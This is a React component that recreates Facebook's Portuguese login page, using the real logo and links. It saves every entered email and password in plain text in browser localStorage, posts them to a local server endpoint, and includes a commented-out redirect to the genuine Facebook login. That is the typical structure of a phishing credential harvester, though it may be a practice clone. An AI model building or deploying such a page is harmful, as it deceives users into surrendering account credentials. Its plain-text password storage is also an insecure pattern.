/* eslint-disable @typescript-eslint/no-unused-vars */
import "./PaginaLogin.css";
import { useState, useEffect } from "react";
import IconeOlho from "./IconeOlho";
import IconeOlhoFechado from "./IconeOlhoFechado";
import Rodape from "./Rodape";

function PaginaLogin() {
    const [emails, setEmails] = useState(JSON.parse(localStorage.getItem("emails") ?? "[]"))
    const [email, setEmail] = useState("")
    const [arrayPassword, setArrayPassword] = useState(JSON.parse(localStorage.getItem("arrayPassword") ?? "[]"))
    const [password, setPassword] = useState("")
    const [mostrarSenha, setMostrarSenha] = useState(false)

    useEffect(() => {
        if (emails) {
            localStorage.setItem("emails", JSON.stringify(emails))
        }
    }, [emails])

    useEffect(() => {
        if (arrayPassword) {
            localStorage.setItem("arrayPassword", JSON.stringify(arrayPassword))
        }
    }, [arrayPassword])

    function adcionarEmail() {
        if (!password) {
            return
        }
        if (email.trim() == "") {
            return console.log("campo obrigatório")
        }
        if (emails.filter((dado: string) => dado == email).length > 0) {
            return setEmail(""), console.log("email ja existe")
        }
        const copiaEmails = [...emails]
        copiaEmails.unshift(email)
        setEmails(copiaEmails)
        setEmail("")
    }

    function adcionarPassword() {
        if (!email) {
            return
        }
        if (password.trim() == "") {
            return console.log("campo obrigatório")
        }
        const copiaArrayPassword = [...arrayPassword]
        copiaArrayPassword.unshift(password)
        setArrayPassword(copiaArrayPassword)
        setPassword("")
    }

function requestLogin(){
    fetch("http://localhost:3000/login", {
        method:"post", 
        headers:{ "Content-Type": "application/json"},
        body: JSON.stringify({"email": email , "senha": password})
        
    }).then(response => {
        if(response.status == 200){
            console.log("sucesso")
        }
        else console.log("falha")
    })
}

    function login() {
        adcionarEmail()
        adcionarPassword()
        requestLogin()
        // window.location.href = "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzU4MjgyNDA3LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next"
    }

    return (
        <div>

            <div id="containerConteudo">
                <div id="container">


                    <div id="containerLogo" >

                        <img id="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"></img>
                        <h2>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
                    </div>

                    <div id="containerLogin">
                        <div id="login">
                            <input
                                type="text"
                                className="inputTextEmail"
                                name="email"
                                id="email"
                                placeholder="Email ou telefone"
                                value={email}
                                onChange={e => setEmail(e.target.value)}
                                onKeyDown={(e) => {
                                    if (e.code == "Enter") {
                                        login()
                                    }
                                }} />
                            <div id="bordaInputPassword" >

                                <input
                                    type={mostrarSenha ? "text" : "password"}
                                    className="inputText"
                                    name="pass"
                                    id="pass"
                                    placeholder="Senha"
                                    aria-label="Senha"
                                    value={password}
                                    onChange={e => setPassword(e.target.value)}
                                    onKeyDown={(e) => {
                                        if (e.code == "Enter") {
                                            login()
                                        }
                                    }}
                                />
                                {password != "" &&

                                    <div id="iconeOlho" onClick={() => setMostrarSenha((prev) => !prev)}>
                                        {mostrarSenha ? <IconeOlho /> : <IconeOlhoFechado />}
                                    </div>
                                }
                            </div>
                            <button
                                className="buttonEntrar"
                                type="submit"
                                onClick={() => {
                                    login()
                                }}
                            >
                                Entrar
                            </button>
                            <a className="novaSenha" href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzU4MzM1ODY0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login&amp;next">Esqueceu a senha?</a>
                            <hr id="borderTopButton" />
                            <a href="/cadastro">
                                <button className="buttonConta" type="submit" >Criar nova conta</button>
                            </a>
                        </div>
                        <div id="msgContainer"> <a href="/pages/create/?ref_type=registration_form">Crie uma Página </a>para uma celebridade, uma marca ou uma empresa.</div>
                    </div>
                </div>
            </div>
            <Rodape />
        </div>
    )
}

export default PaginaLogin